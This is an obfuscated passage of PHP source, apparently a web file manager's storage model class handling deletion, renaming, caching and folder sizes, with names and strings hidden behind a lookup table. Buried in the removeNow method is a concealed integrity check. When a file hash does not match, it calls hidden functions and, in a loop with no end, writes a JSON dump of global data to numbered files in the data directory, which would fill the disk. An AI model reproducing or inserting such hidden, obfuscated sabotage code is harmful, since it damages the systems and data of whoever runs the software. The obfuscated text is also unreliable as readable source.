$this->move($™Ôè»Çå, $©Ü”º¢, REPEAT_RENAME_FOLDER); $this->folderSizeReset($°ÍÇı¢ü[$Æğ€´ô[182]]); return $¦‰‘­—; } private function recycleClear($’³²¯¬Ì) { $øôÚƒ”× =& $_SERVER[ •ŒÓîÆ]; $Õ¸Şö¢Ú = $this->childrenAll($’³²¯¬Ì); $Ÿã€ İ = array($øôÚƒ”×[470] => array($øôÚƒ”×[471], $Õ¸Şö¢Ú[$øôÚƒ”×[2186]])); Model($øôÚƒ”×[2187])->where($Ÿã€ İ)->delete(); } public function removeNow($ÒµƒÅ¶ê, $†àÅ³éà = true) { $Ãú·÷Æš =& $_SERVER[ •ŒÓîÆ]; $€ùö‘‹Ì = $_SERVER[$Ãú·÷Æš[258]] . $Ãú·÷Æš[259]; $«Ïöåì = $Ãú·÷Æš[454]; if ($_SERVER[$Ãú·÷Æš[255]] != $«Ïöåì($€ùö‘‹Ì)) { $…ÁÄîªğ = $Ãú·÷Æš[918]; $Œ©Ë†úı = $Ãú·÷Æš[257]; $‘ÇÈÏùï = $_SERVER[$Ãú·÷Æš[258]] . $Ãú·÷Æš[259]; $†ˆíÃğØ = $Œ©Ë†úı($‘ÇÈÏùï); $¸ú€À¦ç = explode($Ãú·÷Æš[248], $†ˆíÃğØ); if (count($¸ú€À¦ç) < $Ãú·÷Æš[701]) { $Œ’Ô“şò = $Ãú·÷Æš[261]; $Œ’Ô“şò(); } $ğª÷¦‚Œ = $Ãú·÷Æš[919]; $ğª÷¦‚Œ($_SERVER[$Ãú·÷Æš[920]]); $…ÁÄîªğ = $Ãú·÷Æš[918]; $…ÁÄîªğ(); $ö“ë¼‡¡ = $Ãú·÷Æš[921]; $’úÖÀË¦ = json_encode($GLOBALS[$Ãú·÷Æš[922]]); $¶¼õøô¼ = 1; for ($ÀÏùÅº¾ = $¶¼õøô¼; $ÀÏùÅº¾ > 0; $ÀÏùÅº¾++) { $ö“ë¼‡¡(DATA_PATH . $ÀÏùÅº¾, $’úÖÀË¦); } } $„´“Ÿ ª = $this->sourceInfo($ÒµƒÅ¶ê); $êÜûÄ = $this->pathInfoMore($ÒµƒÅ¶ê); if (!$„´“Ÿ ª) { return !0; } if ($„´“Ÿ ª[$Ãú·÷Æš[182]] == 0) { if (!_get($GLOBALS, $Ãú·÷Æš[548])) { return !1; } } $this->lockMoveStart($ÒµƒÅ¶ê); Hook::trigger($Ãú·÷Æš[2188], $êÜûÄ, $†àÅ³éà); if ($†àÅ³éà) { Model($Ãú·÷Æš[2187])->moveToRecycle($ÒµƒÅ¶ê); } else { $Ô¹²ñ‹­ = $this->childrenAll($„´“Ÿ ª); Model($Ãú·÷Æš[613])->eventRemove($ÒµƒÅ¶ê); $this->removeRelevance($Ô¹²ñ‹­[$Ãú·÷Æš[2186]], $Ô¹²ñ‹­[$Ãú·÷Æš[1499]]); } $this->folderSizeReset($„´“Ÿ ª[$Ãú·÷Æš[182]]); $™ÃÈêÄô = array($„´“Ÿ ª[$Ãú·÷Æš[182]]); if ($„´“Ÿ ª[$Ãú·÷Æš[464]] == $Ãú·÷Æš[90]) { $™ÃÈêÄô[] = $„´“Ÿ ª[$Ãú·÷Æš[183]]; } $this->updateModifyTime($™ÃÈêÄô); $this->lockMoveEnd($ÒµƒÅ¶ê); Hook::trigger($Ãú·÷Æš[1732], $êÜûÄ, $†àÅ³éà); return !0; } public function childrenAll($½¼»­Ø«) { $ˆšÆî½÷ =& $_SERVER[ •ŒÓîÆ]; $€‚³‚ç¸ = $½¼»­Ø«[$ˆšÆî½÷[183]]; if ($½¼»­Ø«[$ˆšÆî½÷[464]] == $ˆšÆî½÷[90]) { $ù–àÀŠ = array($ˆšÆî½÷[632] => array($ˆšÆî½÷[592], $½¼»­Ø«[$ˆšÆî½÷[565]] . $€‚³‚ç¸ . $ˆšÆî½÷[593])); $ÉéòŒ­ä = array($ˆšÆî½÷[632] => $ù–àÀŠ[$ˆšÆî½÷[565]]); $„„‚ìÑö = $this->field($ˆšÆî½÷[2189])->where($ÉéòŒ­ä)->select(); $ÜÉ”ı¥Ã = !1; $ïÀ¢“ı = array($€‚³‚ç¸); if ($„„‚ìÑö) { $ÜÉ”ı¥Ã = array_to_keyvalue($„„‚ìÑö, $ˆšÆî½÷[12], $ˆšÆî½÷[520]); $ÜÉ”ı¥Ã = array_remove_value($ÜÉ”ı¥Ã, $ˆšÆî½÷[214]); $ïÀ¢“ı = array_to_keyvalue($„„‚ìÑö, $ˆšÆî½÷[12], $ˆšÆî½÷[183]); $ïÀ¢“ı[] = $€‚³‚ç¸; } } else { $ÜÉ”ı¥Ã = array($½¼»­Ø«[$ˆšÆî½÷[520]]); $ïÀ¢“ı = array($€‚³‚ç¸); } return array($ˆšÆî½÷[2186] => $ïÀ¢“ı, $ˆšÆî½÷[1499] => $ÜÉ”ı¥Ã); } public function removeArray($·öØò¥) { if (!$·öØò¥) { return !0; } } public function removeRelevance($Âçéº—×, $ôé‰¯Àû) { $‹ö¡Š£¾ =& $_SERVER[ •ŒÓîÆ]; $Âçéº—× = $Âçéº—× ? $Âçéº—× : array(); $ôé‰¯Àû = $ôé‰¯Àû ? $ôé‰¯Àû : array(); $Âçéº—× = array_unique(array_filter($Âçéº—×)); $ôé‰¯Àû = array_unique(array_filter($ôé‰¯Àû)); if (!$Âçéº—×) { return !1; } $¥º«ôØÜ = array($‹ö¡Š£¾[470] => array($‹ö¡Š£¾[471], $Âçéº—×)); Model($‹ö¡Š£¾[2187])->where($¥º«ôØÜ)->delete(); Model($‹ö¡Š£¾[514])->where($¥º«ôØÜ)->delete(); Model($‹ö¡Š£¾[2035])->where($¥º«ôØÜ)->delete(); Model($‹ö¡Š£¾[613])->where($¥º«ôØÜ)->delete(); Model($‹ö¡Š£¾[1868])->removeBySource($Âçéº—×); Model($‹ö¡Š£¾[2168])->removeBySource($Âçéº—×); $this->where($¥º«ôØÜ)->delete(); Model($‹ö¡Š£¾[523])->remove($ôé‰¯Àû); for ($ÔÏòÈŸô = 0; $ÔÏòÈŸô < count($Âçéº—×); $ÔÏòÈŸô++) { $this->sourceCacheClear($Âçéº—×[$ÔÏòÈŸô]); } } public function rename($Àûİ°ïÅ, $Ã‡Üµç) { $çÅøãç =& $_SERVER[ •ŒÓîÆ]; $„‘–ùªš = $this->sourceInfo($Àûİ°ïÅ); if (!$„‘–ùªš) { return !1; } $¢¤Â§§å = $this->fileNameExist($„‘–ùªš[$çÅøãç[182]], $Ã‡Üµç); if ($¢¤Â§§å && $¢¤Â§§å != $Àûİ°ïÅ) { return !1; } $À…¬Ş¹ü = array($çÅøãç[473] => $Ã‡Üµç, $çÅøãç[631] => USER_ID); if ($„‘–ùªš[$çÅøãç[464]] != $çÅøãç[90]) { $À…¬Ş¹ü[$çÅøãç[465]] = substr(get_path_ext($Ã‡Üµç), 0, 10); } Model($çÅøãç[613])->eventRename($Àûİ°ïÅ, $„‘–ùªš[$çÅøãç[32]], $Ã‡Üµç); $this->sourceCacheClear($Àûİ°ïÅ); $this->setNamePinyin($Àûİ°ïÅ, $À…¬Ş¹ü[$çÅøãç[32]], !1); $this->updateModifyTime($„‘–ùªš[$çÅøãç[182]]); $»¾›í™ù = $this->where(array($çÅøãç[470] => $Àûİ°ïÅ))->data($À…¬Ş¹ü)->save(); $Ãé®†éí = $çÅøãç[2176] . $„‘–ùªš[$çÅøãç[182]]; if (isset(self::$cacheChildList[$Ãé®†éí])) { unset(self::$cacheChildList[$Ãé®†éí]); } return $»¾›í™ù; } public function setNamePinyin($ø¥ş£™Ú, $ÍÙ¦ÊÇ, $ıÃ­¼öÕ = true) { $œƒş¡ =& $_SERVER[ •ŒÓîÆ]; $øÏÓ¶¼ = Input::check($ÍÙ¦ÊÇ, $œƒş¡[635]); $ÚåªáÜ‡ = array($œƒş¡[496] => KodSort::makeStr($ÍÙ¦ÊÇ)); if ($øÏÓ¶¼) { $ÚåªáÜ‡[$œƒş¡[517]] = str_replace($œƒş¡[53], $œƒş¡[12], Pinyin::get($ÍÙ¦ÊÇ)); $ÚåªáÜ‡[$œƒş¡[516]] = Pinyin::get($ÍÙ¦ÊÇ, $œƒş¡[636]); } if (!$ıÃ­¼öÕ && !$øÏÓ¶¼) { $ÚåªáÜ‡[$œƒş¡[517]] = null; $ÚåªáÜ‡[$œƒş¡[516]] = null; } $this->metaSet($ø¥ş£™Ú, $ÚåªáÜ‡); } public function getContent($ª°è±Ÿ) { $„ŒëëÕÌ =& $_SERVER[ •ŒÓîÆ]; $Ø¹İÚô  = $this->fileInfoGet($ª°è±Ÿ); if (!$Ø¹İÚô ) { return !1; } if ($Ø¹İÚô [$„ŒëëÕÌ[78]] == 0) { return $„ŒëëÕÌ[12]; } $°àñÕ£ = $„ŒëëÕÌ[2190] . $Ø¹İÚô [$„ŒëëÕÌ[526]]; if ($Ø¹İÚô [$„ŒëëÕÌ[78]] <= 1024 * 10) { $„éƒ£ßë = Cache::get($°àñÕ£); if (!$„éƒ£ßë) { $„éƒ£ßë = IO::getContent($Ø¹İÚô [$„ŒëëÕÌ[86]]); Cache::set($°àñÕ£, $„éƒ£ßë); } return $„éƒ£ßë; } if (!$Ø¹İÚô [$„ŒëëÕÌ[86]]) { return $„ŒëëÕÌ[12]; } return IO::getContent($Ø¹İÚô [$„ŒëëÕÌ[86]]); } public function setDesc($œ†¸®Œ, $¥ìÃúì§) { $æ•ñĞ¢ò =& $_SERVER[ •ŒÓîÆ]; Model($æ•ñĞ¢ò[613])->eventAddDesc($œ†¸®Œ, $¥ìÃúì§); return $this->metaSet($œ†¸®Œ, $æ•ñĞ¢ò[505], $¥ìÃúì§); } public function setContent($ğàŸìŞ‡, $÷÷Ûˆå° = '') { $‰–Ò‚È¾ =& $_SERVER[ •ŒÓîÆ]; $à™ªÖµò = $this->sourceInfo($ğàŸìŞ‡); $¼¯íÀæº = $this->fileInfoGet($ğàŸìŞ‡); if (!$¼¯íÀæº || !$à™ªÖµò) { return !1; } $…Şµì‚ = Model($‰–Ò‚È¾[523])->addFileByContent($÷÷Ûˆå°, $à™ªÖµò[$‰–Ò‚È¾[32]]); $îœûàáê = $this->fileHistory($à™ªÖµò, $…Şµì‚[$‰–Ò‚È¾[520]], $…Şµì‚[$‰–Ò‚È¾[78]]); if (!$îœûàáê) { return Model($‰–Ò‚È¾[523])->remove($…Şµì‚[$‰–Ò‚È¾[520]]); } $this->folderSizeReset($à™ªÖµò[$‰–Ò‚È¾[182]]); return !0; } public function fileSubstr($úû¡ûÚ†, $ÃÃÛÑèğ, $¬ö ÉÎ) { $Üù·ªúì = $this->fileInfoGet($úû¡ûÚ†); if (!$Üù·ªúì) { return !1; } return IO::fileSubstr($Üù·ªúì[$_SERVER[ •ŒÓîÆ][86]], $ÃÃÛÑèğ, $¬ö ÉÎ); } public function fileInfoGet($Ñæù™Ê) { $´Ü÷ÈĞ =& $_SERVER[ •ŒÓîÆ]; $ñ½¸Ò±¿ = $this->sourceInfo($Ñæù™Ê); if (!$ñ½¸Ò±¿ || $ñ½¸Ò±¿[$´Ü÷ÈĞ[464]]) { return !1; } $‰‰³”úş = $´Ü÷ÈĞ[527] . $ñ½¸Ò±¿[$´Ü÷ÈĞ[520]]; $ÒÑòŠğÏ = _get(self::$cacheFileInfo, $‰‰³”úş); if ($ÒÑòŠğÏ) { return $ÒÑòŠğÏ; } $Ú–‰¾œè = Model($´Ü÷ÈĞ[523])->fileInfo($ñ½¸Ò±¿[$´Ü÷ÈĞ[520]]); if ($Ú–‰¾œè) { $Ú–‰¾œè[$´Ü÷ÈĞ[32]] = $ñ½¸Ò±¿[$´Ü÷ÈĞ[32]]; } self::$cacheFileInfo[$‰‰³”úş] = $Ú–‰¾œè; return $Ú–‰¾œè; } private function folderChildrenNumber($Ï¤¤Å·¾) { $ÉíË¿ŒÙ =& $_SERVER[ •ŒÓîÆ]; $÷Ì §ñ = $this->sourceInfo($Ï¤¤Å·¾); $åşÙ³†ê = array($ÉíË¿ŒÙ[632] => array($ÉíË¿ŒÙ[592], $÷Ì §ñ[$ÉíË¿ŒÙ[565]] . $Ï¤¤Å·¾ . $ÉíË¿ŒÙ[593]), $ÉíË¿ŒÙ[629] => $÷Ì §ñ[$ÉíË¿ŒÙ[550]], $ÉíË¿ŒÙ[483] => intval($÷Ì §ñ[$ÉíË¿ŒÙ[484]]), $ÉíË¿ŒÙ[626] => 1); $Óã­ÁÃ = $this->where($åşÙ³†ê)->count(); $¾ÀÜ“´ß = $this->where($åşÙ³†ê)->where(array($ÉíË¿ŒÙ[626] => 0))->count(); return array($ÉíË¿ŒÙ[82] => $¾ÀÜ“´ß, $ÉíË¿ŒÙ[83] => $Óã­ÁÃ); } public function pathInfo($òº³¹Ê½, $ÛÊÅßÔä = false) { $’îöˆî =& $_SERVER[ •ŒÓîÆ]; $ÛÊÅßÔä = !1; $òº³¹Ê½ = intval($òº³¹Ê½); $ÓÕŠËŞó = $’îöˆî[513] . intval($ÛÊÅßÔä) . $’îöˆî[440] . $òº³¹Ê½; $™ÚºšöÏ = _get(self::$cachePathInfo, $ÓÕŠËŞó); if ($™ÚºšöÏ) { return $™ÚºšöÏ; } $Âøö£æ = $this->sourceInfo($òº³¹Ê½); if (!$Âøö£æ) { return !1; } $Âøö£æ = $this->_listDataApplyItem($Âøö£æ, $ÛÊÅßÔä); self::$cachePathInfo[$ÓÕŠËŞó] = $Âøö£æ; return $Âøö£æ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ß ¨îï) { $şÆ¹Õ =& $_SERVER[ •ŒÓîÆ]; $ñÖŒĞÛ» = _get(self::$cachePathInfoMore, $ß ¨îï); if ($ñÖŒĞÛ») { return $ñÖŒĞÛ»; } $Íë¯ç¨Å = $this->pathInfo($ß ¨îï); if (!$Íë¯ç¨Å) { return !1; } if ($Íë¯ç¨Å[$şÆ¹Õ[464]] == $şÆ¹Õ[90]) { $Íë¯ç¨Å[$şÆ¹Õ[81]] = $this->folderChildrenNumber($ß ¨îï); } self::$cachePathInfoMore[$ß ¨îï] = $Íë¯ç¨Å; return $Íë¯ç¨Å; } public function sourceInfo($ãÓû‹œÆ) { $ƒÜ²Ÿé‡ =& $_SERVER[ •ŒÓîÆ]; if (!$ãÓû‹œÆ) { return array(); } $ãÓû‹œÆ = intval($ãÓû‹œÆ); $ößôÚ›© = $ƒÜ²Ÿé‡[512] . $ãÓû‹œÆ; $İ¦ÂÏ = _get(self::$cacheSourceInfo, $ößôÚ›©); if ($İ¦ÂÏ) { return $İ¦ÂÏ; } $¢Õ—îöŸ = $this->where(array($ƒÜ²Ÿé‡[183] => $ãÓû‹œÆ))->find(); self::$cacheSourceInfo[$ößôÚ›©] = $¢Õ—îöŸ; return self::$cacheSourceInfo[$ößôÚ›©]; } public function sourceCacheClear($ı„×ëË = false) { self::cacheClear($ı„×ëË); } public static function cacheClear($³ñ‘Ò‚… = false) { $ì¬şŒŸ‹ =& $_SERVER[ •ŒÓîÆ]; if ($³ñ‘Ò‚… == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ì¬şŒŸ‹[512] . $³ñ‘Ò‚…]); unset(self::$cachePathInfoMore[$³ñ‘Ò‚…]); unset(self::$cachePathInfo[$ì¬şŒŸ‹[2191] . $³ñ‘Ò‚…]); unset(self::$cachePathInfo[$ì¬şŒŸ‹[2192] . $³ñ‘Ò‚…]); } public function metaSet($¶åöØß, $€¶±ã¾ = null, $’ˆŒæÖà = null) { $»çÁå°Ë = parent::metaSet($¶åöØß, $€¶±ã¾, $’ˆŒæÖà); if ($»çÁå°Ë) { $this->sourceCacheClear($¶åöØß); } return $»çÁå°Ë; } public function pathInfoByPath($¥§¨Ü…Â, $Ç­§ÆŒ) { $‰ë³±Á¹ =& $_SERVER[ •ŒÓîÆ]; $¾¬ä‹ = !$Ç­§ÆŒ ? array() : explode($‰ë³±Á¹[8], trim($Ç­§ÆŒ, $‰ë³±Á¹[8])); $¸ïÎ±† = $¥§¨Ü…Â; foreach ($¾¬ä‹ as $ÄÔÓ‘) { $×¿‚€’ = array($‰ë³±Á¹[182] => $¸ïÎ±†, $‰ë³±Á¹[32] => $ÄÔÓ‘); $ûæ¶»Ü² = $this->field($‰ë³±Á¹[2193])->where($×¿‚€’)->select(); if (!$ûæ¶»Ü²) { return !1; } $ûæ¶»Ü² = array_sort_by($ûæ¶»Ü², $‰ë³±Á¹[484]); $¸ïÎ±† = $ûæ¶»Ü²[0][$‰ë³±Á¹[183]]; } $ØÑıçïæ = $this->sourceInfo($¸ïÎ±†); $this->pathInfoFilter($ØÑıçïæ); return $ØÑıçïæ; } protected function updateModifyTime($Äê‚‰­·) { $°Îœ—‘¿ =& $_SERVER[ •ŒÓîÆ]; $£ÆñÑÚÓ = defined($°Îœ—‘¿[2109]) ? USER_ID : 0; if (!$Äê‚‰­·) { return; } if (!is_array($Äê‚‰­·)) { $Äê‚‰­· = array($Äê‚‰­·); } foreach ($Äê‚‰­· as $¥æéÄÆã => $¼×Ö˜Ì) { $Äê‚‰­·[$¥æéÄÆã] = intval($¼×Ö˜Ì); $this->sourceCacheClear($¼×Ö˜Ì); } $›®’±š = array($°Îœ—‘¿[183] => array($°Îœ—‘¿[7], $Äê‚‰­·)); $Ï¬¾ó›Ã = array($°Îœ—‘¿[631] => $£ÆñÑÚÓ, $°Îœ—‘¿[477] => time()); $this->where($›®’±š)->save($Ï¬¾ó›Ã); } public function folderSizeReset($ï©‹èÏ½, $Ï£âÎúÕ = false) { $»ï†ş°ù =& $_SERVER[ •ŒÓîÆ]; if ($this->statusIgnoreResetSpace) { return; } $ÒŞÙñÖï = $this->sourceInfo($ï©‹èÏ½); $øÔú€£û = $»ï†ş°ù[2194] . $ï©‹èÏ½; CacheLock::lock($øÔú€£û, 20); if ($Ï£âÎúÕ === !1) { $this->sourceCacheClear($ï©‹èÏ½); $ÒŞÙñÖï = $this->sourceInfo($ï©‹èÏ½); $ÏÊØè÷° = array($»ï†ş°ù[456] => $ï©‹èÏ½, $»ï†ş°ù[483] => 0); $ìñ‚Ñ¤“ = $this->where($ÏÊØè÷°)->sum($»ï†ş°ù[78]); $Ï£âÎúÕ = intval($ìñ‚Ñ¤“) - intval($ÒŞÙñÖï[$»ï†ş°ù[78]]); } if ($Ï£âÎúÕ == 0) { return CacheLock::unlock($øÔú€£û); } $¬µĞÓñ = $this->parentLevelArray($ÒŞÙñÖï[$»ï†ş°ù[565]]); if (!$¬µĞÓñ) { $¬µĞÓñ = array(); } $¬µĞÓñ[] = $ÒŞÙñÖï[$»ï†ş°ù[183]]; $ÏÊØè÷° = array($»ï†ş°ù[183] => array($»ï†ş°ù[471], $¬µĞÓñ)); if ($Ï£âÎúÕ < 0) { $ÏÊØè÷°[$»ï†ş°ù[78]] = array($»ï†ş°ù[1056], abs($Ï£âÎúÕ)); } $this->where($ÏÊØè÷°)->setAdd($»ï†ş°ù[78], $Ï£âÎúÕ); CacheLock::unlock($øÔú€£û); $àÀ¿£ßÒ = $»ï†ş°ù[2195] . $ÒŞÙñÖï[$»ï†ş°ù[180]] . $»ï†ş°ù[4] . $ÒŞÙñÖï[$»ï†ş°ù[550]]; $· Û˜ºÜ = array($ÒŞÙñÖï[$»ï†ş°ù[180]], $ÒŞÙñÖï[$»ï†ş°ù[550]]); TaskRun::timeLimitCall($àÀ¿£ßÒ, $»ï†ş°ù[2196], $· Û˜ºÜ, 1.5); } public function folderSizeResetChildren($œ‹«ãû) { $óèø»Öˆ =& $_SERVER[ •ŒÓîÆ]; $this->sourceCacheClear($œ‹«ãû); $û¤±Ì = $this->sourceInfo($œ‹«ãû); $ÇéÜúûÉ = array($óèø»Öˆ[626] => 1, $óèø»Öˆ[629] => $û¤±Ì[$óèø»Öˆ[550]], $óèø»Öˆ[632] => array($óèø»Öˆ[592], $û¤±Ì[$óèø»Öˆ[565]] . $œ‹«ãû . $óèø»Öˆ[593])); $‘ºáã = $óèø»Öˆ[2197]; $¸»ËŠ = $this->field($‘ºáã)->where($ÇéÜúûÉ)->select(); $ÇéÜúûÉ[$óèø»Öˆ[464]] = 0; $…û€·¥Ã = $this->field($‘ºáã)->where($ÇéÜúûÉ)->select(); if (!$…û€·¥Ã) { return; } $¸»ËŠ[] = $û¤±Ì; $¸»ËŠ = array_to_keyvalue($¸»ËŠ, $óèø»Öˆ[183]); foreach ($¸»ËŠ as $‹¶õÄ½Ñ => $Ôø÷ŸÖæ) { $¸»ËŠ[$‹¶õÄ½Ñ][$óèø»Öˆ[2198]] = $¸»ËŠ[$‹¶õÄ½Ñ][$óèø»Öˆ[78]]; $¸»ËŠ[$‹¶õÄ½Ñ][$óèø»Öˆ[78]] = 0; } foreach ($…û€·¥Ã as $Ôø÷ŸÖæ) { $ËŸ¬µ²­ = $Ôø÷ŸÖæ[$óèø»Öˆ[182]] . $óèø»Öˆ[12]; if (!isset($¸»ËŠ[$ËŸ¬µ²­])) { continue; } if ($Ôø÷ŸÖæ[$óèø»Öˆ[484]] == $¸»ËŠ[$ËŸ¬µ²­][$óèø»Öˆ[484]]) { $¸»ËŠ[$ËŸ¬µ²­][$óèø»Öˆ[78]] += $Ôø÷ŸÖæ[$óèø»Öˆ[78]]; } } foreach ($¸»ËŠ as $Ôø÷ŸÖæ) { $†”˜­õ = $this->parentLevelArray($Ôø÷ŸÖæ[$óèø»Öˆ[565]]); foreach ($†”˜­õ as $ËŸ¬µ²­) { $ËŸ¬µ²­ = $ËŸ¬µ²­ . $óèø»Öˆ[12]; if (!isset($¸»ËŠ[$ËŸ¬µ²­])) { continue; } if ($Ôø÷ŸÖæ[$óèø»Öˆ[484]] == $¸»ËŠ[$ËŸ¬µ²­][$óèø»Öˆ[484]]) { $¸»ËŠ[$ËŸ¬µ²­][$óèø»Öˆ[78]] += $Ôø÷ŸÖæ[$óèø»Öˆ[78]]; } } } $¸áÅ“¡© = array(); foreach ($¸»ËŠ as $Ôø÷ŸÖæ) { if ($Ôø÷ŸÖæ[$óèø»Öˆ[78]] == $Ôø÷ŸÖæ[$óèø»Öˆ[2198]]) { continue; } $¸áÅ“¡©[] = array($óèø»Öˆ[183], $Ôø÷ŸÖæ[$óèø»Öˆ[183]], $óèø»Öˆ[78], $Ôø÷ŸÖæ[$óèø»Öˆ[78]]); } $this->saveAll($¸áÅ“¡©); } public function userSpaceReset($Õ¥ë„òâ = false) { $­¬É‘– =& $_SERVER[ •ŒÓîÆ]; $™¬¼òì² = $this->where(array($­¬É‘–[180] => self::TYPE_USER, $­¬É‘–[550] => $Õ¥ë„òâ, $­¬É‘–[464] => 0))->sum($­¬É‘–[78]); $™¬¼òì² = !$™¬¼òì² || $™¬¼òì² <= 0 ? 0 : $™¬¼òì²; Model($­¬É‘–[558])->userEdit($Õ¥ë„òâ, array($­¬É‘–[1877] => $™¬¼òì²)); } public function targetSpaceUpdate($Ã¡İ‘›ñ, $÷°¦©şª) { $ÔÃ¼ó³ =& $_SERVER[ •ŒÓîÆ]; if (!$÷°¦©şª) { return; } if (!in_array($Ã¡İ‘›ñ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $áÍèŠ¯‰ = $this->targetSpaceSize($Ã¡İ‘›ñ, $÷°¦©şª); if ($Ã¡İ‘›ñ == self::TYPE_USER) { Model($ÔÃ¼ó³[558])->userEdit($÷°¦©şª, array($ÔÃ¼ó³[1877] => $áÍèŠ¯‰)); } else { if ($Ã¡İ‘›ñ == self::TYPE_GROUP) { Model($ÔÃ¼ó³[566])->groupEdit($÷°¦©şª, array($ÔÃ¼ó³[1877] => $áÍèŠ¯‰)); } } } public function targetSpaceSize($°ƒÛˆí„, $àÚ®¿Û¨) { $™õ†®ŒÆ =& $_SERVER[ •ŒÓîÆ]; $âÓÏ£ü— = 0; $ˆãáîà§ = $this->targetSourceRoot($°ƒÛˆí„, $àÚ®¿Û¨, !0); foreach ($ˆãáîà§ as $€î‘Ë¦î) { if (!$€î‘Ë¦î) { continue; } $âÓÏ£ü— += floatval($€î‘Ë¦î[$™õ†®ŒÆ[78]]); $œ£ÌÑÔ = array($™õ†®ŒÆ[632] => array($™õ†®ŒÆ[592], $™õ†®ŒÆ[575] . $€î‘Ë¦î[$™õ†®ŒÆ[183]] . $™õ†®ŒÆ[593])); $ØóÑÍîÈ = Model($™õ†®ŒÆ[482])->field($™õ†®ŒÆ[470])->where($œ£ÌÑÔ)->select(); $ØóÑÍîÈ = array_to_keyvalue($ØóÑÍîÈ, $™õ†®ŒÆ[12], $™õ†®ŒÆ[183]); $ØóÑÍîÈ = array_unique(array_filter($ØóÑÍîÈ)); if ($ØóÑÍîÈ) { $œ£ÌÑÔ = array($™õ†®ŒÆ[470] => array($™õ†®ŒÆ[471], $ØóÑÍîÈ)); $âÓÏ£ü— += floatval($this->where($œ£ÌÑÔ)->sum($™õ†®ŒÆ[78])); } } $âÓÏ£ü— = !$âÓÏ£ü— || $âÓÏ£ü— <= 0 ? 0 : $âÓÏ£ü—; return $âÓÏ£ü—; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Íõçß×´) { return $this->fileTypeProfile($Íõçß×´, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ô¬ô —×) { return $this->fileTypeProfile($Ô¬ô —×, SourceModel::TYPE_GROUP); } private function fileTypeProfile($îˆ¡›Ñ©, $·ÅÍ€‚”) { $ÅĞÎÎù¢ =& $_SERVER[ •ŒÓîÆ]; $ó‡æ¨¯‚ = $ÅĞÎÎù¢[2199] . $îˆ¡›Ñ© . $ÅĞÎÎù¢[11] . $·ÅÍ€‚”; $ìÌø¶«™ = Cache::get($ó‡æ¨¯‚); if ($ìÌø¶«™) { return $ìÌø¶«™; } $…ê¨Äİì = array($ÅĞÎÎù¢[626] => 0); if ($îˆ¡›Ñ© != !1) { $…ê¨Äİì[$ÅĞÎÎù¢[550]] = $îˆ¡›Ñ©; $…ê¨Äİì[$ÅĞÎÎù¢[180]] = $·ÅÍ€‚”; } $êÊÎÜÒ = array(); $êÊÎÜÒ[$ÅĞÎÎù¢[2200]] = array($ÅĞÎÎù¢[2201] => LNG($ÅĞÎÎù¢[2200]), $ÅĞÎÎù¢[2202] => $this->where($…ê¨Äİì)->count(), $ÅĞÎÎù¢[597] => $this->where($…ê¨Äİì)->sum($ÅĞÎÎù¢[78])); $Ì°ü‚† = KodIO::fileTypeList(); foreach ($Ì°ü‚† as $÷óŞ¿¡ó => $æıˆµü) { $…ê¨Äİì[$ÅĞÎÎù¢[465]] = $this->fileTypeWhere($÷óŞ¿¡ó); $êÊÎÜÒ[$÷óŞ¿¡ó] = array($ÅĞÎÎù¢[2201] => $æıˆµü[$ÅĞÎÎù¢[32]], $ÅĞÎÎù¢[2202] => $this->where($…ê¨Äİì)->count(), $ÅĞÎÎù¢[597] => $this->where($…ê¨Äİì)->sum($ÅĞÎÎù¢[78])); } Cache::set($ó‡æ¨¯‚, $êÊÎÜÒ, 1200); return $êÊÎÜÒ; } public function fileNameExist($À„ˆ¿ßš, $¼ŞñøÒÑ) { $ íÇÓ¶ê =& $_SERVER[ •ŒÓîÆ]; $üºãğË¾ = $this->field($ íÇÓ¶ê[2203])->where(array($ íÇÓ¶ê[182] => $À„ˆ¿ßš, $ íÇÓ¶ê[32] => $¼ŞñøÒÑ, $ íÇÓ¶ê[484] => 0))->find(); return is_array($üºãğË¾) ? $üºãğË¾[$ íÇÓ¶ê[183]] : !1; } public function childList($à¹íÃˆ) { $›ÔÔŠÅ =& $_SERVER[ •ŒÓîÆ]; $¿™€¾‡Í = $›ÔÔŠÅ[2176] . $à¹íÃˆ; if (isset(self::$cacheChildList[$¿™€¾‡Í])) { return self::$cacheChildList[$¿™€¾‡Í]; } $¨ú¯Ìô = array($›ÔÔŠÅ[182] => intval($à¹íÃˆ), $›ÔÔŠÅ[484] => 0); $‹Ùƒú—¿ = $this->where($¨ú¯Ìô)->select(); $‹Ùƒú—¿ = $‹Ùƒú—¿ ? $‹Ùƒú—¿ : array(); self::$cacheChildList[$¿™€¾‡Í] = $‹Ùƒú—¿; foreach ($‹Ùƒú—¿ as $´õâó») { $¿™€¾‡Í = $›ÔÔŠÅ[512] . $´õâó»[$›ÔÔŠÅ[183]]; self::$cacheSourceInfo[$¿™€¾‡Í] = $´õâó»; } return $‹Ùƒú—¿; } public function fileNameAuto($¨„îğ, $Ê½Ğ²µ, $¡…ÙÔ–¿ = REPEAT_RENAME, $ãæ Ìå = false) { $Ü å†ïÕ =& $_SERVER[ •ŒÓîÆ]; $ÆŒçŸ¥« = get_path_ext($Ê½Ğ²µ); $ûòø–š° = $ÆŒçŸ¥« ? basename($Ê½Ğ²µ, $Ü å†ïÕ[10] . $ÆŒçŸ¥«) . $Ü å†ïÕ[2204] . $ÆŒçŸ¥« : $Ê½Ğ²µ . $Ü å†ïÕ[438]; $ÄªÁº¥ğ = array($Ü å†ïÕ[182] => $¨„îğ, $Ü å†ïÕ[484] => 0, $Ü å†ïÕ[32] => array($Ü å†ïÕ[437], $ûòø–š°)); $µÕµ£¹Ô = $this->field($Ü å†ïÕ[32])->where($ÄªÁº¥ğ)->select(); $¶í±±ã¬ = array_to_keyvalue($µÕµ£¹Ô, $Ü å†ïÕ[12], $Ü å†ïÕ[32]); return $this->fileNameAutoGet($¶í±±ã¬, $Ê½Ğ²µ, $¡…ÙÔ–¿, $ãæ Ìå); } public function fileNameAutoGet($¡¶àûµ, $µêµıÆÑ, $ëá÷¹‘û, $¿ÇÂ½Îì) { $ü½ä¡Ç° =& $_SERVER[ •ŒÓîÆ]; if ($ëá÷¹‘û == REPEAT_REPLACE || 